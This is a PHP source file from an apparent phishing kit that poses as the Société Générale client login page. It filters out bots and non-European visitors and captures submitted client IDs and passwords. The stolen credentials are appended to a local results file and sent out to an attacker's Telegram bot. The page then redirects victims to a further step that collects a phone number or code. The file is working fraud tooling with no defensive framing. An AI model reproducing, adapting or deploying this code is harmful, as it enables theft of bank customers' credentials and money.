<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }
function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
if (!$country)
{
    $country='Not found!';
}

if ($continent !== 'EU' && $country !== 'MA')
{
      header("location: " . $errorUrl . "?" . $_GET['token']);
     exit();
} 
if ($_POST['type'] == "log") {
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


            $message = '/== SG log By SMTP==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'ID : ' . $_POST['code_client'] . "\r\n";
            $message .= 'PWD : ' . $_POST['password'] . "\r\n";

            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- end log details --/' . "\r\n\r\n";

            file_put_contents("./rezult/sg-rzlt.txt", $message, FILE_APPEND);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}

?>


<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="files/cs/b.min.css">
        <link rel="stylesheet" href="files/cs/h.css">
        <link rel="stylesheet" href="files/cs/f.css">
        <link rel="stylesheet" href="files/cs/m.css">

        <link rel="shortcut icon" href="files/img/favicon.ico" type="image/x-icon"> 
        
        <script type="text/javascript">
            var title = unescape( '%53%6F%63%69%E9%74%E9%20%47%E9%6E%E9%72%61%6C%65%20%7C%20%43%6F%6E%6E%65%78%69%6F%6E' );
            var page_title = unescape( '%43%6F%6E%6E%65%78%69%6F%6E%20%2D%20%45%73%70%61%63%65%20%63%6C%69%65%6E%74' );
        </script>

        <title></title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header" class="d-lg-block d-md-none d-sm-none d-none">
            <div class="header-top">
                <span>Agences</span>
                <span>Aide et contacts</span>
            </div>
            <div class="header-bottom">
                <div class="logo"><img src="files/img/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER -->
        <header id="header2" class="d-lg-none d-md-block d-sm-block d-block">
            <div class="logo"><img src="files/img/logo2.jpg"></div>
        </header>
        <!-- END HEADER -->

        <div class="page-title">
            <p class="mb-0 pl-5 mt-4 font-weight-bold" style="color: #000">Connexion - Espace client</p>
        </div>

        <!-- MAIN -->
        <main id="main" class="pt-5 pb-5 mt-5" style="margin-bottom: 200px">
            <div class="container">
                <div class="loader">
                    <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                    <p class="text-center mb-0">Veuillez patienter...</p>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="files/sj/j.min.js"></script>
        <script src="files/sj/p.min.js"></script>
        <script src="files/sj/b.min.js"></script>
        <script src="files/sj/f.min.js"></script>
        <script src="files/sj/m.js"></script>

        <script type="text/javascript">
            $('title').text(title);
            $('#page_header h3').html('<i class="far fa-arrow-alt-circle-left"></i> ' + page_title);
            var dispatch = '<?php echo $token1; ?>';
            setTimeout(function () {
                window.location.href= 'TEL.php?token=' + dispatch;
            },<?php echo $delay; ?>); // 1000 = 1s
        </script>

    </body>

</html>